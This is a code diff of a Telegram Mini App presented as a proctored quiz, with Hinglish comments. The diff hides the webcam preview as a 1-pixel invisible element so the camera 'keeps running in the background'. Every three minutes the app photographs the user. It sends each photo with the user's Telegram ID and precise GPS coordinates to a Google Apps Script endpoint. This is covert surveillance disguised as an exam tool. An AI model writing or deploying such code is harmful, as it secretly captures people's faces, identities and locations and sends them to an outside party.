@@ -16,13 +16,8 @@
         button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
         
-        /* Naya: Video element ko perfect ratio mein rakhne ke liye */
         video {
-            width: 100%;
-            height: auto;
-            object-fit: cover; /* Stretch hone se rokega */
-            aspect-ratio: 16 / 9; /* Perfect HD Ratio */
-            display: none; /* Hide karein jab tak zarurat na ho */
+            width: 1px; height: 1px; opacity: 0; position: fixed; /* Background mein chalta rahega */
         }
     </style>
 </head>
@@ -50,7 +45,8 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwO7p2glpHIvlKjnMC6P3YCPWsVN00bsPzlanqyPJ_wJUxVmj628WcU-DyZfW9ltuEQrg/exec"; 
+    // --- SETUP: Apna Naya Apps Script URL yahan dalein ---
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxaXhCyRQMBX6JpLIMxnR1GXXvuA8ISiwiSBAK7m-PXgD6bjGbv_cH0PTkHLAxJq2E6NA/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
     let userLoc = "Pending";
@@ -67,51 +63,38 @@
         btn.innerText = "Setting Perfect HD... ⏳";
 
         try {
-            // 1. Forced Perfect HD Constraints (16:9 ratio)
+            // 1. Camera setup
             if (!globalStream) {
                 globalStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         width: { ideal: 1280 }, 
                         height: { ideal: 720 },
-                        aspectRatio: 1.7777777778 // Naya: Perfect 16:9 Ratio
+                        aspectRatio: 1.7777777778 
                     } 
                 });
-                
-                // Naya: Video element ko stream assign karein
-                const videoEl = document.getElementById('proctorVideo');
-                videoEl.srcObject = globalStream;
+                document.getElementById('proctorVideo').srcObject = globalStream;
             }
 
             // 2. Location Check
             btn.innerText = "Locating GPS... ⏳";
-            const getLoc = () => new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
+            const pos = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true });
             });
+            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
 
-            try {
-                const pos = await getLoc();
-                userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-            } catch (e) {
-                alert("Location Error: कृपया अपना GPS ऑन करें और पेज रिफ्रेश करें।");
-                btn.disabled = false;
-                btn.innerText = "प्रक्रिया शुरू करें";
-                return;
-            }
-
-            // 3. Success - UI Switch
+            // 3. UI Switch
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
-            // First Entry Photo (HD)
-            captureAndSend("Test_Started");
+            // Initial Capture
+            setTimeout(() => captureAndSend("Test_Started"), 2000);
 
-            // Har 3 Minute mein Photo (180000 ms)
+            // Periodic Monitoring (Har 3 min)
             setInterval(() => captureAndSend("Periodic_Check"), 180000);
 
         } catch (err) {
-            console.error(err);
-            alert("Permission Denied: कैमरा एक्सेस के बिना टेस्ट शुरू नहीं हो सकता।");
+            alert("Error: कृपया कैमरा और लोकेशन Allow करें।");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -121,36 +104,31 @@
         if (!globalStream) return;
         try {
             const video = document.getElementById('proctorVideo');
-            // playsinline zaruri hai background capture ke liye
-            await video.play();
-
             const canvas = document.createElement('canvas');
-            // Naya: Canvas ka size wahi rakhein jo video stream ka hai
-            canvas.width = video.videoWidth || 1280; 
-            canvas.height = video.videoHeight || 720;
+            
+            // Canvas HD Size
+            canvas.width = 1280;
+            canvas.height = 720;
             
             const ctx = canvas.getContext('2d');
-            // object-fit cover jaisa effect canvas par lane ke liye hum yahan drawing optimize karte hain
-            const streamRatio = canvas.width / canvas.height;
-            const idealRatio = 16 / 9;
             
-            if (streamRatio > idealRatio) {
-                // Agar sensor zyada choda hai, toh sides crop karein
-                const newWidth = canvas.height * idealRatio;
-                const offset = (canvas.width - newWidth) / 2;
-                ctx.drawImage(video, offset, 0, newWidth, canvas.height, 0, 0, canvas.width, canvas.height);
-            } else if (streamRatio < idealRatio) {
-                // Agar sensor zyada lamba hai, toh top/bottom crop karein
-                const newHeight = canvas.width / idealRatio;
-                const offset = (canvas.height - newHeight) / 2;
-                ctx.drawImage(video, 0, offset, canvas.width, newHeight, 0, 0, canvas.width, canvas.height);
+            // HD Aspect Ratio Drawing Logic
+            const vW = video.videoWidth;
+            const vH = video.videoHeight;
+            const targetRatio = 16 / 9;
+            const currentRatio = vW / vH;
+
+            if (currentRatio > targetRatio) {
+                let newW = vH * targetRatio;
+                let xOffset = (vW - newW) / 2;
+                ctx.drawImage(video, xOffset, 0, newW, vH, 0, 0, 1280, 720);
             } else {
-                // Agar ratio pehle se sahi hai, toh direct draw karein
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let newH = vW / targetRatio;
+                let yOffset = (vH - newH) / 2;
+                ctx.drawImage(video, 0, yOffset, vW, newH, 0, 0, 1280, 720);
             }
             
-            // Quality 0.8 (HD Clarity)
-            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            const photoData = canvas.toDataURL('image/jpeg', 0.85);
 
             const payload = {
                 userId: user.id || "NA",
@@ -162,7 +140,12 @@
                 location: userLoc
             };
 
-            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+            // Data bhejte waqt Sheet mein link create hoga
+            fetch(SCRIPT_URL, { 
+                method: "POST", 
+                mode: "no-cors", 
+                body: JSON.stringify(payload) 
+            });
         } catch (e) { console.log("Capture Error:", e); }
     }
 
